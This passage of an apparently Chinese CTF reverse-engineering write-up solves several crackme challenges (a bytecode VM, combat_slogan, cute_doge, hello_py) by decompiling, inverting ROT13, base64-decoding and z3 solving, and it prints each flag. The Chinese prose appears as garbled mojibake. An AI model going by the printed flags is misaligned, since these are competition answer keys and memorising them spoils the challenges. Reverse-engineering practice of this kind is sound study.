class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">0: const 60 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 9 592</span><br><span class="line">11: const 26 ; 83 </span><br><span class="line">16: const 27 ; 69 </span><br><span class="line">21: const 28 ; 65 </span><br><span class="line">26: array 3</span><br><span class="line">31: store 0 0</span><br><span class="line">34: const 30 ; 101 </span><br><span class="line">39: const 31 ; 108 </span><br><span class="line">44: const 32 ; 111 </span><br><span class="line">49: const 33 ; 117 </span><br><span class="line">54: const 34 ; 122 </span><br><span class="line">59: const 30 ; 101 </span><br><span class="line">64: const 35 ; 105 </span><br><span class="line">69: const 36 ; 98 </span><br><span class="line">74: const 30 ; 101 </span><br><span class="line">79: const 31 ; 108 </span><br><span class="line">84: const 33 ; 117 </span><br><span class="line">89: const 35 ; 105 </span><br><span class="line">94: const 37 ; 113 </span><br><span class="line">99: const 33 ; 117 </span><br><span class="line">104: const 35 ; 105 </span><br><span class="line">109: const 37 ; 113 </span><br><span class="line">114: array 16</span><br><span class="line">119: store 0 1</span><br><span class="line">122: const 39 ; 0 </span><br><span class="line">127: store 0 2</span><br><span class="line">130: array 0</span><br><span class="line">135: store 0 3</span><br><span class="line">138: load 0 2</span><br><span class="line">141: const 42 ; 256 </span><br><span class="line">146: lt</span><br><span class="line">147: jz 184</span><br><span class="line">152: load 0 3</span><br><span class="line">155: const 43 ; append </span><br><span class="line">160: getattr</span><br><span class="line">161: load 0 2</span><br><span class="line">164: call 1</span><br><span class="line">166: pop</span><br><span class="line">167: load 0 2</span><br><span class="line">170: const 44 ; 1 </span><br><span class="line">175: add</span><br><span class="line">176: store 0 2</span><br><span class="line">179: jmp 138</span><br><span class="line">184: const 39 ; 0 </span><br><span class="line">189: store 0 4</span><br><span class="line">192: load 0 4</span><br><span class="line">195: const 42 ; 256 </span><br><span class="line">200: lt</span><br><span class="line">201: jz 271</span><br><span class="line">206: load 0 3</span><br><span class="line">209: load 0 4</span><br><span class="line">212: getitem</span><br><span class="line">213: load 0 0</span><br><span class="line">216: load 0 4</span><br><span class="line">219: const 46 ; 3 </span><br><span class="line">224: mod</span><br><span class="line">225: getitem</span><br><span class="line">226: add</span><br><span class="line">227: load 0 1</span><br><span class="line">230: load 0 4</span><br><span class="line">233: const 47 ; 16 </span><br><span class="line">238: mod</span><br><span class="line">239: getitem</span><br><span class="line">240: add</span><br><span class="line">241: const 42 ; 256 </span><br><span class="line">246: mod</span><br><span class="line">247: load 0 3</span><br><span class="line">250: load 0 4</span><br><span class="line">253: setitem</span><br><span class="line">254: load 0 4</span><br><span class="line">257: const 44 ; 1 </span><br><span class="line">262: add</span><br><span class="line">263: store 0 4</span><br><span class="line">266: jmp 192</span><br><span class="line">271: const 39 ; 0 </span><br><span class="line">276: store 0 5</span><br><span class="line">279: load 0 5</span><br><span class="line">282: const 46 ; 3 </span><br><span class="line">287: lt</span><br><span class="line">288: jz 448</span><br><span class="line">293: const 39 ; 0 </span><br><span class="line">298: store 0 6</span><br><span class="line">301: load 0 6</span><br><span class="line">304: const 42 ; 256 </span><br><span class="line">309: lt</span><br><span class="line">310: jz 366</span><br><span class="line">315: load 0 3</span><br><span class="line">318: load 0 6</span><br><span class="line">321: getitem</span><br><span class="line">322: load 0 3</span><br><span class="line">325: load 0 6</span><br><span class="line">328: const 44 ; 1 </span><br><span class="line">333: add</span><br><span class="line">334: const 42 ; 256 </span><br><span class="line">339: mod</span><br><span class="line">340: getitem</span><br><span class="line">341: bxor</span><br><span class="line">342: load 0 3</span><br><span class="line">345: load 0 6</span><br><span class="line">348: setitem</span><br><span class="line">349: load 0 6</span><br><span class="line">352: const 44 ; 1 </span><br><span class="line">357: add</span><br><span class="line">358: store 0 6</span><br><span class="line">361: jmp 301</span><br><span class="line">366: const 39 ; 0 </span><br><span class="line">371: store 0 7</span><br><span class="line">374: load 0 7</span><br><span class="line">377: const 42 ; 256 </span><br><span class="line">382: lt</span><br><span class="line">383: jz 431</span><br><span class="line">388: load 0 3</span><br><span class="line">391: load 0 7</span><br><span class="line">394: getitem</span><br><span class="line">395: const 44 ; 1 </span><br><span class="line">400: add</span><br><span class="line">401: const 42 ; 256 </span><br><span class="line">406: mod</span><br><span class="line">407: load 0 3</span><br><span class="line">410: load 0 7</span><br><span class="line">413: setitem</span><br><span class="line">414: load 0 7</span><br><span class="line">417: const 44 ; 1 </span><br><span class="line">422: add</span><br><span class="line">423: store 0 7</span><br><span class="line">426: jmp 374</span><br><span class="line">431: load 0 5</span><br><span class="line">434: const 44 ; 1 </span><br><span class="line">439: add</span><br><span class="line">440: store 0 5</span><br><span class="line">443: jmp 279</span><br><span class="line">448: const 39 ; 0 </span><br><span class="line">453: store 0 5</span><br><span class="line">456: const 39 ; 0 </span><br><span class="line">461: store 0 8</span><br><span class="line">464: load 0 5</span><br><span class="line">467: const 42 ; 256 </span><br><span class="line">472: lt</span><br><span class="line">473: jz 509</span><br><span class="line">478: load 0 8</span><br><span class="line">481: load 0 3</span><br><span class="line">484: load 0 5</span><br><span class="line">487: getitem</span><br><span class="line">488: add</span><br><span class="line">489: store 0 8</span><br><span class="line">492: load 0 5</span><br><span class="line">495: const 44 ; 1 </span><br><span class="line">500: add</span><br><span class="line">501: store 0 5</span><br><span class="line">504: jmp 464</span><br><span class="line">509: load 0 8</span><br><span class="line">512: const 51 ; 20 </span><br><span class="line">517: mul</span><br><span class="line">518: const 52 ; 5 </span><br><span class="line">523: add</span><br><span class="line">524: store 0 8</span><br><span class="line">527: load 0 8</span><br><span class="line">530: const 54 ; 30 </span><br><span class="line">535: mul</span><br><span class="line">536: const 52 ; 5 </span><br><span class="line">541: sub</span><br><span class="line">542: store 0 8</span><br><span class="line">545: load 0 8</span><br><span class="line">548: const 56 ; 40 </span><br><span class="line">553: mul</span><br><span class="line">554: const 52 ; 5 </span><br><span class="line">559: sub</span><br><span class="line">560: store 0 8</span><br><span class="line">563: load 0 8</span><br><span class="line">566: const 58 ; 50 </span><br><span class="line">571: mul</span><br><span class="line">572: const 59 ; 6645 </span><br><span class="line">577: add</span><br><span class="line">578: store 0 8</span><br><span class="line">581: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">586: load 0 8</span><br><span class="line">589: call 1</span><br><span class="line">591: pop</span><br></pre></td></tr></table></figure></blockquote><p>æ ¹æ®bytecodeè¿˜åŸä»£ç ï¼Œéœ€è¦æ³¨æ„æ•°ç»„çš„å­˜å‚¨é¡ºåºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>,<span class="number">69</span>,<span class="number">65</span>][::-<span class="number">1</span>]</span><br><span class="line">c = [<span class="number">101</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>][::-<span class="number">1</span>]</span><br><span class="line">S = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S[j] = (S[j]+key[j%<span class="number">3</span>]+c[j%<span class="number">16</span>])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[x] = S[x]^S[(x+<span class="number">1</span>)%<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[y] = (S[y]+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b = b+S[k]</span><br><span class="line"></span><br><span class="line">b = b*<span class="number">20</span>+<span class="number">5</span></span><br><span class="line">b = b*<span class="number">30</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">40</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">50</span>+<span class="number">6645</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23075096395</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;23075096395&#125;</code></p><p>â€‹    </p><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><blockquote><p>é¢å¯¹ç–«æƒ…ï¼Œæˆ‘ä»¬çš„å£å·æ˜¯ä»€ä¹ˆï¼Ÿflag{input}</p></blockquote><p>ç”¨jdå·¥å…·åˆ†æjarï¼Œåœ¨Main.classå‘ç°ä¸»ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stringTransformAscii</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sbu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    <span class="type">char</span>[] chars = value.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i != chars.length - <span class="number">1</span>) &#123;</span><br><span class="line">        sbu.append(chars[i]).append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sbu.append(chars[i]);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sbu.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ttk</span><span class="params">(String input)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> input.charAt(i);</span><br><span class="line">      <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      sb.append(c);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input your keyword);</span></span><br><span class="line"><span class="string">    Scanner scan = new Scanner(System.in);</span></span><br><span class="line"><span class="string">    String str2 = &quot;</span>ddd<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if (scan.hasNextLine())</span></span><br><span class="line"><span class="string">      str2 = scan.nextLine(); </span></span><br><span class="line"><span class="string">    scan.close();</span></span><br><span class="line"><span class="string">    String stringTransformAscii = stringTransformAscii(str2);</span></span><br><span class="line"><span class="string">    String[] offerCodeString = stringTransformAscii.split(&quot;</span>,<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    StringBuffer str5 = new StringBuffer();</span></span><br><span class="line"><span class="string">    for (String s : offerCodeString)</span></span><br><span class="line"><span class="string">      str5.append(s); </span></span><br><span class="line"><span class="string">    int flag = ttk(str2).compareTo(&quot;</span>Jr_j11y_s1tug_g0_raq_g0_raq_pnml<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;</span><span class="number">871019511949491089510249103104116951164895101110100951164895101110100959997122121</span><span class="string">&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is correct!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is wrong!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>flagç» <code>ttk()</code> å‡½æ•°å¤„ç†åä¸ <code>Jr_j11y_s1tug_g0_raq_g0_raq_pnml</code> ç›¸åŒï¼Œé€† <code>ttk()</code> æ›¿æ¢å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += k</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We_w11l_f1ght_t0_end_t0_end_cazy</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></p><p>â€‹    </p><h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><blockquote><p>æ™®é€šçš„æŸ´çŠ¬ï¼Œæˆ³ä¸€æˆ³ä¼šå‘ç”Ÿä»€ä¹ˆå¥‡å¦™çš„äº‹æƒ…å‘¢ï¼Ÿ</p></blockquote><p>å°†exeç”¨16è¿›åˆ¶å·¥å…·æŸ¥çœ‹ï¼Œæ ¹æ®è¿è¡Œæç¤ºæ–‡å­—æ‰¾åˆ°é™„è¿‘å­˜åœ¨ <code>ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</code>ï¼Œbase64è§£ç å¾—flagï¼š<code>flag&#123;Ch1na_yyds_cazy&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><blockquote><p>åˆæ¬¡è§é¢ï¼Œé€ä¸ªpythoné¢˜ï¼Œç¥æ‚¨æ¥ä¸‹æ¥è§£é¢˜é¡ºåˆ©ï¼Œflag{input}</p></blockquote><p>uncompyle6åç¼–è¯‘pycæ–‡ä»¶å¾—æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç”¨z3æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f = [BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">flag = f[:]</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">    t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x.add(flag[k]==Happy[k])</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        m = x.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[f[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f))]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># He110_cazy</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;He110_cazy&#125;</code></p><p>â€‹    